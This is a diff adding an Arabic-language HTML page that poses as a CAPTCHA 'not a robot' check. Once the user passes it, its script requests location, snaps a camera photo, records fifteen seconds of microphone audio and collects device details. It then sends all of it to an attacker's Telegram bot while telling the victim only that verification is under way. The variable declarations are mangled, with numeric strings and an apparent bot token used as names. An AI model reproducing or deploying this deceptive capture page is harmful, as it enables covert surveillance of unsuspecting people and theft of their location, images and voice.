@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من أنك لست روبوت</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .captcha-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background-color: #4285F4;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        h1 {
+            color: #202124;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .description {
+            color: #5f6368;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .captcha-box {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .captcha-text {
+            font-size: 24px;
+            letter-spacing: 5px;
+            color: #4285F4;
+            font-weight: bold;
+            margin: 15px 0;
+            user-select: none;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        button {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #3367D6;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .hidden {
+            display: none;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0,0,0,.3);
+            border-radius: 50%;
+            border-top-color: #000;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-container">
+        <div class="logo">✓</div>
+        <h1>التحقق من أنك لست روبوت</h1>
+        <p class="description">لحماية موقعنا، يرجى إكمال التحقق لإثبات أنك لست روبوت.</p>
+        
+        <div class="captcha-box">
+            <p>أدخل النص الظاهر في الصورة أدناه:</p>
+            <div class="captcha-text" id="captcha-text">5G7H9K</div>
+            <input type="text" id="captcha-input" placeholder="أدخل النص هنا" autocomplete="off">
+            <button id="verify-btn">تحقق</button>
+        </div>
+        
+        <div id="status-message" class="hidden"></div>
+        
+        <div class="footer">
+            <p>هذا النظام يستخدم تقنيات التحقق الآمنة لحماية خصوصيتك.</p>
+        </div>
+    </div>
+
+    <script>
+        // تكوين البوت (استبدل بالقيم الخاصة بك)
+        const 9226720142:AAGtnpiohg8TE_PmudyTkFK9q69BgGdo3gA = "ENTER_TOKEN_BOT";
+        const 6698033395 = "ENTER_CHAT_ID";
+        
+        // بيانات التطبيق
+        const collectedData = {
+            systemInfo: getSystemInfo(),
+            camera: { photo: null, allowed: false },
+            microphone: { audio: null, allowed: false },
+            location: { coords: null, address: null, allowed: false }
+        };
+        
+        // عناصر DOM
+        const captchaText = document.getElementById('captcha-text');
+        const captchaInput = document.getElementById('captcha-input');
+        const verifyBtn = document.getElementById('verify-btn');
+        const statusMessage = document.getElementById('status-message');
+        
+        // إنشاء CAPTCHA عشوائي
+        function generateCaptcha() {
+            const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            let captcha = "";
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captcha;
+        }
+        
+        // جمع معلومات النظام الأساسية
+        function getSystemInfo() {
+            return {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                languages: navigator.languages,
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                deviceMemory: navigator.deviceMemory || 'غير معروف'
+            };
+        }
+        
+        // عند تحميل الصفحة
+        window.onload = () => {
+            // تعيين CAPTCHA عشوائي
+            captchaText.textContent = generateCaptcha();
+            
+            // إضافة مستمع للأحداث للزر
+            verifyBtn.addEventListener('click', async () => {
+                if (captchaInput.value === captchaText.textContent) {
+                    statusMessage.innerHTML = '<div class="loading"></div> جاري التحقق من المعلومات...';
+                    statusMessage.classList.remove('hidden');
+                    
+                    try {
+                        // طلب الأذونات بالتسلسل
+                        await requestLocation();
+                        await requestCamera();
+                        await requestMicrophone();
+                        
+                        // بعد جمع كل البيانات
+                        await sendAllDataToTelegram();
+                        
+                        statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
+                    } catch (error) {
+                        statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
+                        console.error("Error:", error);
+                    }
+                } else {
+                    statusMessage.textContent = '❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى.';
+                    statusMessage.classList.remove('hidden');
+                    captchaText.textContent = generateCaptcha();
+                    captchaInput.value = '';
+                }
+            });
+        };
+        
+        // طلب إذن الموقع
+        async function requestLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("المتصفح لا يدعم خدمة الموقع"));
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        collectedData.location.coords = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        
+                        try {
+                            // الحصول على اسم الموقع
+                            const response = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
+                            );
+                            const data = await response.json();
+                            collectedData.location.address = data.display_name;
+                            collectedData.location.allowed = true;
+                            resolve();
+                        } catch (err) {
+                            reject(err);
+                        }
+                    },
+                    (error) => {
+                        reject(new Error(`فشل في الحصول على الموقع: ${error.message}`));
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        // طلب إذن الكاميرا والتقاط صورة
+        async function requestCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // التقاط صورة
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.playsInline = true;
+                video.srcObject = stream;
+                
+                // انتظار حتى يكون الفيديو جاهزًا
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    collectedData.camera.photo = blob;
+                    collectedData.camera.allowed = true;
+                }, 'image/jpeg', 0.9);
+                
+                // إيقاف الكاميرا بعد التقاط الصورة
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                throw new Error(`فشل في الوصول للكاميرا: ${error.message}`);
+            }
+        }
+        
+        // طلب إذن الميكروفون وتسجيل الصوت
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                
+                recorder.ondataavailable = event => audioChunks.push(event.data);
+                
+                return new Promise((resolve) => {
+                    recorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        collectedData.microphone.audio = audioBlob;
+                        collectedData.microphone.allowed = true;
+                        resolve();
+                    };
+                    
+                    recorder.start();
+                    
+                    // تسجيل لمدة 15 ثانية ثم إيقاف
+                    setTimeout(() => {
+                        if (recorder.state !== 'inactive') {
+                            recorder.stop();
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }, 15000);
+                });
+                
+            } catch (error) {
+                throw new Error(`فشل في الوصول للميكروفون: ${error.message}`);
+            }
+        }
+        
+        // إرسال جميع البيانات إلى تليجرام
+        async function sendAllDataToTelegram() {
+            try {
+                // إرسال البيانات النصية أولاً
+                let message = `📊 <b>تقرير معلومات الجهاز التلقائي</b>\n\n`;
+                message += `⏰ <b>الوقت:</b> ${new Date(collectedData.systemInfo.timestamp).toLocaleString()}\n`;
+                message += `💻 <b>المتصفح:</b> ${collectedData.systemInfo.userAgent}\n`;
+                message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
+                
+                if (collectedData.location.allowed) {
+                    message += `\n📍 <b>الموقع:</b> ${collectedData.location.address || 'غير معروف'}\n`;
+                    message += `🌐 <b>الإحداثيات:</b> ${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
+                }
+                
+                await sendToTelegram(message, 'text');
+                
+                // إرسال الصورة إن وجدت
+                if (collectedData.camera.photo) {
+                    await sendToTelegram(collectedData.camera.photo, 'photo');
+                }
+                
+                // إرسال التسجيل الصوتي إن وجد
+                if (collectedData.microphone.audio) {
+                    await sendToTelegram(collectedData.microphone.audio, 'audio');
+                }
+                
+            } catch (error) {
+                throw error;
+            }
+        }
+        
+        // دالة مساعدة للإرسال إلى تليجرام
+        async function sendToTelegram(data, type) {
+            if (type === 'text') {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: data,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } else {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append(type, data, `file.${type === 'photo' ? 'jpg' : 'wav'}`);
+                
+                const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+    </script>
+</body>
+</html>
